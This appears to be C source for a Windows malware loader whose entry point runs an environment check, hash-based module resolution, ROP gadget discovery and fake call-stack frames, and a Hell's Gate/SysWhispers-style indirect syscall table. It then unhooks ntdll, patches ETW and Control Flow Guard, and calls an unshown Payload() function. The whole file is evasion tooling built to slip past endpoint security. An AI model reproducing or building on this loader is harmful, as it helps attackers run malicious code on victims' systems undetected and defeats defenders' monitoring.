#include "myloader.h"

#define HASH_NTDLL      0x8F46551850C1F33B
#define HASH_KERNEL32   0xBDC58DDFCEBE5CE3
#define HASH_KERNELBASE 0x456085A8289E9699
#pragma intrinsic(_ReturnAddress)
#pragma comment(linker, "/ENTRY:main")

typedef BOOL (*FRAME_FINDER)(PVOID moduleBase, PVOID* outFunction, DWORD* outFrameSize, DWORD* outOffset);

typedef struct _VX_ENTRY_INIT {
    VX_TABLE_ENTRY* Entry;
    DWORD64 Hash;
} VX_ENTRY_INIT;

static BOOL ResolveCoreModules(PPEB pPeb) {
    if (!pPeb || !pPeb->LoaderData) return FALSE;

    g_ntdllBase = NULL;
    g_kernel32Base = NULL;
    g_kernelBaseAddr = NULL;

    PLIST_ENTRY listHead = &pPeb->LoaderData->InLoadOrderModuleList;
    for (PLIST_ENTRY entry = listHead->Flink; entry && entry != listHead; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
        if (!module->BaseDllName.Buffer || module->BaseDllName.Length == 0) continue;

        DWORD64 currentHash = djb2_w(module->BaseDllName.Buffer);
        if (currentHash == HASH_NTDLL) {
            g_ntdllBase = module->DllBase;
        } else if (currentHash == HASH_KERNEL32) {
            g_kernel32Base = module->DllBase;
        } else if (currentHash == HASH_KERNELBASE) {
            g_kernelBaseAddr = module->DllBase;
        }

        if (g_ntdllBase && g_kernel32Base && g_kernelBaseAddr) break;
    }

    return g_ntdllBase != NULL;
}

static BOOL TryFindAddRspGadget(PVOID primary, PVOID secondary, PVOID* outGadget, DWORD* outSize, PVOID* outModuleBase) {
    if (outGadget) *outGadget = NULL;
    if (outSize) *outSize = 0;
    if (outModuleBase) *outModuleBase = NULL;

    DWORD size = 0;
    if (primary) {
        PVOID gadget = FindAddRspGadget(primary, &size);
        if (gadget) {
            if (outGadget) *outGadget = gadget;
            if (outSize) *outSize = size;
            if (outModuleBase) *outModuleBase = primary;
            return TRUE;
        }
    }

    if (secondary) {
        PVOID gadget = FindAddRspGadget(secondary, &size);
        if (gadget) {
            if (outGadget) *outGadget = gadget;
            if (outSize) *outSize = size;
            if (outModuleBase) *outModuleBase = secondary;
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL TryFindJmpRbxGadget(PVOID primary, PVOID secondary, PVOID* outGadget, DWORD* outSize, PVOID* outModuleBase) {
    if (outGadget) *outGadget = NULL;
    if (outSize) *outSize = 0;
    if (outModuleBase) *outModuleBase = NULL;

    DWORD size = 0;
    if (primary) {
        PVOID gadget = FindJmpRbxGadget(primary, &size);
        if (gadget) {
            if (outGadget) *outGadget = gadget;
            if (outSize) *outSize = size;
            if (outModuleBase) *outModuleBase = primary;
            return TRUE;
        }
    }

    if (secondary) {
        PVOID gadget = FindJmpRbxGadget(secondary, &size);
        if (gadget) {
            if (outGadget) *outGadget = gadget;
            if (outSize) *outSize = size;
            if (outModuleBase) *outModuleBase = secondary;
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL TryFindFrame(FRAME_FINDER finder, PVOID primary, PVOID secondary, PVOID* outFunction, DWORD* outFrameSize, DWORD* outOffset, PVOID* outModuleBase) {
    if (!finder || !outFunction || !outFrameSize || !outOffset) return FALSE;
    if (outModuleBase) *outModuleBase = NULL;

    if (primary && finder(primary, outFunction, outFrameSize, outOffset)) {
        if (outModuleBase) *outModuleBase = primary;
        return TRUE;
    }

    if (secondary && finder(secondary, outFunction, outFrameSize, outOffset)) {
        if (outModuleBase) *outModuleBase = secondary;
        return TRUE;
    }

    return FALSE;
}

static BOOL PopulateVxTable(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE table) {
    if (!ntdllBase || !pImageExportDirectory || !table) return FALSE;

    VX_ENTRY_INIT entries[] = {
        { &table->NtQueryVirtualMemory, 0x7b76856c5f5e03eb },
        { &table->NtOpenSection,        -0x232b43f96af4a364LL },
        { &table->NtUnmapViewOfSection, 0x332cb162d5108a3b },
        { &table->NtAllocateVirtualMemory, 0x174406488BC9F61A },
        { &table->NtCreateThreadEx,     0x6369311DE803FFBE },
        { &table->NtProtectVirtualMemory, 0x7ECDF05E75DD73D6 },
        { &table->NtWaitForSingleObject, 0x428DB567403CED8A },
        { &table->NtOpenFile,           0x78112189316BDC27 },
        { &table->NtCreateSection,      0x509694E18B3D659E },
        { &table->NtMapViewOfSection,   0xC4BF03775D88D378 },
        { &table->NtClose,              0x4DF1413226846A0B }
    };

    for (size_t i = 0; i < sizeof(entries) / sizeof(entries[0]); i++) {
        entries[i].Entry->dwHash = entries[i].Hash;
        if (!GetVxTableEntry(ntdllBase, pImageExportDirectory, entries[i].Entry)) {
            return FALSE;
        }
    }

    return TRUE;
}

void main() {
    // 1. 初始化 TEB/PEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb ? pCurrentTeb->ProcessEnvironmentBlock : NULL;
    if (!CheckEnvironment()) return;

    srand(GetTickCount());
    g_returnAddress = (PVOID)_AddressOfReturnAddress();
    if (!pCurrentTeb || !pCurrentPeb) return;
    if (!ResolveCoreModules(pCurrentPeb)) return;
    if (!g_kernel32Base) g_kernel32Base = g_ntdllBase;
    
    // 3. 获取 Gadgets
    g_pRandomSyscallGadget = GetSyscallGadget(g_ntdllBase);
    PVOID addRspModuleBase = NULL;
    if (!TryFindAddRspGadget(g_kernelBaseAddr, g_kernel32Base, &g_pStackGadget, &g_StackGadgetSize, &addRspModuleBase)) {
        return;
    }

    g_JmpRbxGadgetFrameSize = 0;
    PVOID jmpModuleBase = NULL;
    g_pThunkGadget = NULL;
    if (addRspModuleBase == g_kernel32Base) {
        TryFindJmpRbxGadget(g_kernel32Base, NULL, &g_pThunkGadget, &g_JmpRbxGadgetFrameSize, &jmpModuleBase);
    } else {
        TryFindJmpRbxGadget(g_kernelBaseAddr, g_kernel32Base, &g_pThunkGadget, &g_JmpRbxGadgetFrameSize, &jmpModuleBase);
    }
    if (!g_pThunkGadget) return;

    frame_Root_Ntdll = NULL;        // Desync FirstFrame
    frame_Mid_Kernel = NULL;        // Desync SecondFrame
    kernelFrameModuleBase = NULL;   // Desync SecondFrame module base

    PVOID secondFrameModuleBase = NULL;
    DWORD secondFrameSize = 0;
    DWORD secondRbpOffset = 0;
    if (jmpModuleBase == g_kernel32Base) {
        TryFindFrame(FindPushRbpFrame, g_kernel32Base, NULL, &frame_Mid_Kernel, &secondFrameSize, &secondRbpOffset, &secondFrameModuleBase);
    } else {
        TryFindFrame(FindPushRbpFrame, g_kernelBaseAddr, g_kernel32Base, &frame_Mid_Kernel, &secondFrameSize, &secondRbpOffset, &secondFrameModuleBase);
    }

    if (!frame_Mid_Kernel) {
        return ;
    }

    kernelFrameModuleBase = secondFrameModuleBase;
    g_RbpPushOffset = secondRbpOffset;
    g_SecondFrameSize = secondFrameSize;
    g_SecondFrameOffset = FindCallSiteOffset(frame_Mid_Kernel, kernelFrameModuleBase);

    PVOID firstFrameModuleBase = NULL;
    DWORD firstFrameSize = 0;
    DWORD firstFpOffset = 0;
    if (secondFrameModuleBase == g_kernel32Base) {
        TryFindFrame(FindPrologFrame, g_kernel32Base, NULL, &frame_Root_Ntdll, &firstFrameSize, &firstFpOffset, &firstFrameModuleBase);
    } else {
        TryFindFrame(FindPrologFrame, g_kernelBaseAddr, g_kernel32Base, &frame_Root_Ntdll, &firstFrameSize, &firstFpOffset, &firstFrameModuleBase);
    }

    if (!frame_Root_Ntdll) {
        return;
    }

    g_FirstFrameSize = firstFrameSize;
    g_FirstFrameOffset = FindCallSiteOffset(frame_Root_Ntdll, firstFrameModuleBase);

    if (g_FirstFrameSize == 0 || g_SecondFrameSize == 0) {
        return;
    }
    if (g_RbpPushOffset == RBP_OFFSET_INVALID) {
        return;
    }
    if (!SW3_PopulateSyscallList(g_ntdllBase)) return;
    // 5. 获取导出表并填充 Syscall 表
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(g_ntdllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return;
    VX_TABLE Table = { 0 };
    if (!PopulateVxTable(g_ntdllBase, pImageExportDirectory, &Table)) return;
    // 6. 执行
    BOOL bNeedsUnhooking = IsNtdllTainted(&Table);
    if (bNeedsUnhooking) {
        UnhookNtdll(&Table); 
    }
    PatchEtw(&Table); 
    PatchCFG(&Table);
    Payload();
    return;
}
